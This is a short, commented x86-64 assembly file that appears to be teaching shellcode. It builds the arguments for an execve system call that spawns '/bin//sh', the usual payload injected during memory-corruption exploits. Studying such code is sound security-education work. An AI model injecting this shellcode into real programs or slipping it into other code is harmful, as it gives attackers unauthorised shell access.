; assemble: fasm shell64.asm
use64

xor rdx, rdx ; rdx = 0: execve()’s 3rd argument
push rdx
mov rax, '/bin//sh' ; the command we want to run
push rax ;
mov rdi, rsp ; rdi --> "/bin//sh": execve()’s 1st argument
push rdx ; argv[1] = 0
push rdi ; argv[0] --> "/bin//sh"
mov rsi, rsp ; rsi --> argv[]: execve()’s 2nd argument
xor rax, rax
mov al, 0x3b ; execve()’s system call number
syscall
